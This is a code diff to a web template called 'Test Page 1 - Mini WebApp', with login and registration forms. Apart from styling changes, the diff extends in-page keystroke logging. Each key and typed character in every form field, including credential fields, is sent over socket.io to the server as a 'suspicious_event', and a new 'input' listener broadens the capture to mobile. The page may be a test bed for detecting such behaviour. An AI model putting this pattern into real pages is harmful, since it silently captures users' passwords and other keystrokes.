@@ -4,28 +4,53 @@
     <title>Test Page 1</title>
     <script src="//cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-               background: linear-gradient(135deg,#f5f7fa,#c3cfe2); color:#333; }
-        header { background: rgba(255,255,255,0.9); backdrop-filter: blur(8px); 
-                 color:#333; padding:25px; text-align:center; font-size:28px; font-weight:bold; 
-                 box-shadow:0 6px 20px rgba(0,0,0,0.1); border-radius:0 0 15px 15px; }
-        .container { width:90%; max-width:600px; margin:40px auto; background: rgba(255,255,255,0.95); 
-                     padding:25px; border-radius:20px; box-shadow:0px 10px 25px rgba(0,0,0,0.1); 
-                     text-align:center; }
-        .nav-btn { background: linear-gradient(135deg,#4a90e2,#50e3c2); color:white; 
-                   padding:12px 20px; border:none; border-radius:12px; cursor:pointer; 
-                   font-size:16px; font-weight:bold; margin:5px; transition:0.3s; }
-        .nav-btn:hover { background: linear-gradient(135deg,#357ab8,#1abc9c); transform: translateY(-2px); }
-        input, textarea { width:90%; padding:12px; margin:10px 0; border:1px solid #ddd; border-radius:12px; font-size:16px; }
-        a.page-link { text-decoration:none; color:#4a90e2; font-weight:bold; transition:0.3s; font-size:16px; display:inline-block; margin-top:15px; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(135deg,#f5f7fa,#c3cfe2); 
+            color:#333; margin:0; padding:0;
+        }
+        header { 
+            background: rgba(255,255,255,0.9); backdrop-filter: blur(8px); 
+            color:#333; padding:25px; text-align:center; font-size:28px; font-weight:bold; 
+            box-shadow:0 6px 20px rgba(0,0,0,0.1); border-radius:0 0 15px 15px; 
+        }
+        .container { 
+            width:90%; max-width:600px; margin:40px auto; background: rgba(255,255,255,0.95); 
+            padding:25px; border-radius:20px; box-shadow:0px 10px 25px rgba(0,0,0,0.1); text-align:center; 
+        }
+        .nav-btn { 
+            background: linear-gradient(135deg,#4a90e2,#50e3c2); color:white; padding:12px 20px; 
+            border:none; border-radius:12px; cursor:pointer; font-size:16px; font-weight:bold; 
+            margin:5px; transition:0.3s; 
+        }
+        .nav-btn:hover { 
+            background: linear-gradient(135deg,#357ab8,#1abc9c); transform: translateY(-2px); 
+        }
+        input, textarea { 
+            width:90%; padding:12px; margin:10px 0; border:1px solid #ddd; border-radius:12px; font-size:16px; 
+            box-sizing:border-box; 
+        }
+        a.page-link { 
+            text-decoration:none; color:#4a90e2; font-weight:bold; transition:0.3s; font-size:16px; 
+            display:inline-block; margin-top:15px; 
+        }
         a.page-link:hover { color:#357ab8; text-decoration:underline; }
         form { margin-top:20px; }
+
+        @media (max-width:768px){
+            .nav-btn { width:100%; padding:12px 0; font-size:15px; }
+            input, textarea { width:95%; font-size:15px; padding:10px; }
+        }
+        @media (max-width:480px){
+            header { font-size:24px; padding:20px; }
+            .container { margin:20px auto; padding:20px; }
+            input, textarea { font-size:14px; padding:8px; }
+        }
     </style>
 </head>
 <body>
     <header>Test Page 1 - Mini WebApp</header>
     <div class="container">
-        <!-- Navigation -->
         <div>
             <button class="nav-btn" data-section="Login">Login</button>
             <button class="nav-btn" data-section="Register">Register</button>
@@ -35,12 +60,7 @@
         </div>
 
         <p id="currentSection">Current Section: Login</p>
-
-        <!-- Dynamic Form -->
-        <form id="dynamicForm">
-            <!-- Fields will be injected here -->
-        </form>
-
+        <form id="dynamicForm"></form>
         <a href="{{ url_for('home') }}" class="page-link">Back to Dashboard</a>
     </div>
 
@@ -50,7 +70,6 @@
         const currentSectionDisplay = document.getElementById("currentSection");
         let currentSection = "Login";
 
-        // Form templates per section
         const sections = {
             "Login": [
                 {type:"text", name:"username", placeholder:"Username"},
@@ -77,31 +96,35 @@
         function renderForm(section){
             form.innerHTML = "";
             sections[section].forEach(field => {
-                let input;
-                if(field.type === "textarea"){
-                    input = document.createElement("textarea");
-                } else {
-                    input = document.createElement("input");
-                    input.type = field.type;
-                }
+                let input = field.type === "textarea" ? document.createElement("textarea") : document.createElement("input");
+                input.type = field.type !== "textarea" ? field.type : undefined;
                 input.name = field.name;
                 input.placeholder = field.placeholder;
                 form.appendChild(input);
 
-                // Add keypress listener
+                // Mobile & Desktop safe key logging
+                input.addEventListener("input", function(e){
+                    let val = e.data || e.target.value.slice(-1) || "Unknown";
+                    socket.emit("suspicious_event", { 
+                        website:"TestPage1", 
+                        key: val + " (" + section + " - " + field.name + ")" 
+                    });
+                });
+
                 input.addEventListener("keydown", function(e){
-                    let key = e.key;
+                    let key = e.key || "Unknown";
                     if(key === " ") key = "Space";
                     if(key === "Enter") key = "Enter";
-                    socket.emit("suspicious_event", { website:"TestPage1", key:key + " ("+section+" - "+field.name+")" });
+                    socket.emit("suspicious_event", { 
+                        website:"TestPage1", 
+                        key: key + " (" + section + " - " + field.name + ")" 
+                    });
                 });
             });
         }
 
-        // Initialize with Login form
         renderForm("Login");
 
-        // Navigation buttons
         document.querySelectorAll(".nav-btn").forEach(btn => {
             btn.addEventListener("click", function(){
                 currentSection = btn.dataset.section;
